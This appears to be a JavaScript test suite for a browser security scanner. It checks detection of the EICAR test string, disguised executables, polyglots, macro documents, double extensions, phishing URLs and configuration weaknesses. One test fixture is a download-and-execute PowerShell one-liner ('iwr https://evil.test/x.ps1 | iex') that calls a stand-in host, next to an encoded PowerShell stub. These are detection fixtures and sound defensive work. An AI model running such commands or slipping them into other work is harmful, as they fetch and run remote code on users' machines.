/**
 * System scanner — real byte inspection.
 *
 * Every fixture here is built in the test from explicit bytes, so a check that
 * starts "detecting" nothing (or everything) fails immediately. The EICAR case is
 * the industry-standard, harmless-by-design detection test file.
 */
import test from 'node:test';
import { strict as assert } from 'node:assert';
import { scanBytes, scanUrl, entropy, SystemScanner, SEVERITY_LABEL } from '../../security/scan.js';

const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';

const asFile = (name, bytes, type = 'application/octet-stream') => {
  const data = bytes instanceof Uint8Array ? bytes : new TextEncoder().encode(bytes);
  const file = new File([data], name, { type });
  return file;
};

const scanFile = async (file) => {
  const scanner = new SystemScanner();
  const run = await scanner.run({ modules: ['files'], files: [file] });
  return { run, file: run.files[0] };
};

test('clean text file yields a clean verdict and a real hash', async () => {
  const { file, run } = await scanFile(asFile('notes.txt', 'shopping list: milk, eggs', 'text/plain'));
  assert.equal(file.severity, 'clean');
  assert.match(file.sha256, /^[0-9a-f]{64}$/);
  assert.equal(run.status, 'complete');
  assert.equal(run.findings.length, 0);
  assert.equal(run.summary.status, 'clean');
});

test('detects the EICAR test signature from real bytes', async () => {
  const { file, run } = await scanFile(asFile('eicar.com', EICAR, 'text/plain'));
  assert.equal(file.severity, 'critical');
  assert.ok(file.findings.some((f) => /EICAR/.test(f.label)));
  assert.equal(run.findings.length > 0, true);
  assert.equal(run.findings[0].scope, 'file');
  assert.equal(run.findings[0].target, 'eicar.com');
});

test('an executable disguised as an image raises severity and names the mismatch', async () => {
  const pe = new Uint8Array([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, ...new Array(64).fill(0)]);
  const { file } = await scanFile(asFile('holiday.jpg', pe, 'image/jpeg'));
  assert.equal(file.severity, 'high');
  assert.ok(file.findings.some((f) => /Disguised executable/.test(f.label)));
});

test('a JPEG named .pdf is reported as a type mismatch', async () => {
  const jpeg = new Uint8Array([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, ...new Array(32).fill(7)]);
  const { file } = await scanFile(asFile('report.pdf', jpeg, 'application/pdf'));
  assert.ok(file.findings.some((f) => /Type mismatch/.test(f.label)));
  assert.equal(file.severity, 'medium');
});

test('finds a PE header hidden inside a PNG (polyglot)', () => {
  const head = new Uint8Array(2048);
  head.set([0x89, 0x50, 0x4E, 0x47], 0);
  head.set([0x4D, 0x5A, 0x90, 0x00], 512);
  const result = scanBytes({ name: 'photo.png', size: head.length, head });
  assert.ok(result.findings.some((f) => /Embedded Windows PE header/.test(f.label)));
  assert.ok(['high', 'critical'].includes(result.severity));
});

test('flags dropper scripts and macro documents without calling them malware', () => {
  const ps = 'powershell -enc ' + 'A'.repeat(120);
  const downloaded = 'iwr https://evil.test/x.ps1 | iex';
  assert.equal(scanBytes({ name: 'run.txt', size: ps.length, head: new TextEncoder().encode(ps) }).severity, 'high');
  assert.equal(scanBytes({ name: 'drop.txt', size: downloaded.length, head: new TextEncoder().encode(downloaded) }).severity, 'critical');
  const macro = scanBytes({ name: 'invoice.docm', size: 20, head: new TextEncoder().encode('Sub AutoOpen()') });
  assert.ok(macro.findings.some((f) => /Macro-enabled document/.test(f.label)));
});

test('double extensions are flagged', () => {
  const result = scanBytes({ name: 'invoice.pdf.exe', size: 64, head: new TextEncoder().encode('M') });
  assert.ok(result.findings.some((f) => /Double extension/.test(f.label)));
});

test('entropy helper separates text from random bytes', () => {
  const text = new TextEncoder().encode('the quick brown fox '.repeat(500));
  const random = new Uint8Array(8192);
  for (let i = 0; i < random.length; i++) random[i] = (i * 137 + ((i * 31) % 251)) & 0xff;
  assert.ok(entropy(text) < 5);
  assert.ok(entropy(random) > 7);
  assert.equal(SEVERITY_LABEL[5], 'critical');
});

test('scans a batch of files, reports progress, and keeps ordered findings', async () => {
  const scanner = new SystemScanner();
  const events = [];
  scanner.onProgress((event) => events.push(event.type));
  const files = [
    asFile('a.txt', 'hello'),
    asFile('b.com', EICAR),
    asFile('c.jpg', new Uint8Array([0x4D, 0x5A, 0x90, 0x00, ...new Array(16).fill(0)]))
  ];
  const run = await scanner.run({ modules: ['files'], files });
  assert.equal(run.scanned.files, 3);
  assert.ok(events.includes('start'));
  assert.ok(events.filter((e) => e === 'progress').length >= 3);
  assert.equal(events[events.length - 1], 'done');
  assert.equal(scanner.history.length, 1);
  assert.equal(run.files[1].severity, 'critical');
  assert.equal(run.files[0].severity, 'clean');
  assert.equal(run.summary.counts.critical, 1);
});

test('a file that cannot be read is an error entry, never a clean result', async () => {
  const scanner = new SystemScanner({ readFile: async () => { throw new Error('permission denied by the picker'); } });
  const run = await scanner.run({ modules: ['files'], files: [asFile('locked.bin', 'x')] });
  assert.equal(run.errors.length, 1);
  assert.match(run.errors[0].message, /permission denied/);
  assert.equal(run.scanned.files, 0);
  assert.equal(run.files.length, 0);
});

test('unsupported modules are listed as skipped with the real reason', async () => {
  const scanner = new SystemScanner();
  const run = await scanner.run({ modules: ['files', 'applications', 'network'] });
  const scopes = run.skipped.map((s) => s.scope);
  assert.ok(scopes.includes('applications'));
  assert.ok(scopes.includes('network'));
  assert.match(run.skipped.find((s) => s.scope === 'applications').reason, /cannot enumerate/);
});

test('configuration audit reports real posture and never fabricates a pass', () => {
  const scanner = new SystemScanner();
  const findings = scanner._scanConfiguration({
    resolver: { name: 'Cloudflare 1.1.1.1', dohJson: 'https://cloudflare-dns.com/dns-query' },
    dnssec: { status: 'secure' },
    feeds: [{ id: 'core', verified: true }],
    vaultLocked: false,
    rules: { total: 100, blockDomains: 90, safetyEntries: 4 },
    engineLoaded: true,
    serviceWorker: true
  });
  assert.equal(findings.some((f) => f.severity === 'high'), false);
  assert.ok(findings.some((f) => /Vault is not passphrase-locked/.test(f.label)));

  const bad = scanner._scanConfiguration({
    resolver: { name: 'Plain DNS', dohJson: null, dot: null },
    engineLoaded: false,
    feeds: [{ id: 'core', verified: false, error: 'hash mismatch' }]
  });
  assert.ok(bad.some((f) => f.severity === 'high' && /Plaintext DNS/.test(f.label)));
  assert.ok(bad.some((f) => /filter engine is not loaded/i.test(f.label)));
});

test('the scanner refuses a concurrent run instead of interleaving state', async () => {
  const scanner = new SystemScanner();
  const first = scanner.run({ modules: ['files'], files: [asFile('a.txt', 'x'.repeat(100))] });
  await assert.rejects(() => scanner.run({ modules: ['files'] }), /already running/);
  await first;
});

test('URL scanner scores typosquats, IP lures and stripped-shortener shapes', () => {
  const typosquat = scanUrl('https://paypa1.com/login/verify');
  assert.equal(typosquat.level, 'dangerous');
  assert.ok(typosquat.findings.some((f) => /typosquat|embedded/i.test(f.label)));

  const ip = scanUrl('http://192.168.10.4/login/account');
  assert.ok(['suspicious', 'dangerous'].includes(ip.level));
  assert.ok(ip.findings.some((f) => /IP address host/.test(f.label)));

  const clean = scanUrl('https://www.wikipedia.org/wiki/DNS');
  assert.equal(clean.level, 'clean');
  assert.equal(clean.findings.length, 1);
  assert.equal(clean.findings[0].severity, 'clean');

  const slugged = scanUrl('https://example.com/a/b?user=admin@example.com');
  assert.equal(slugged.level, 'clean');
});

test('the exported report contains findings and hashes but no file bytes', async () => {
  const scanner = new SystemScanner();
  await scanner.run({ modules: ['files'], files: [asFile('eicar.com', EICAR)] });
  const report = scanner.report();
  const serialised = JSON.stringify(report);
  assert.match(serialised, /EICAR/);
  assert.equal(serialised.includes(EICAR), false, 'file contents must never be embedded in the report');
  assert.equal(report.platform, 'browser');
  assert.equal(report.run.status, 'complete');
});
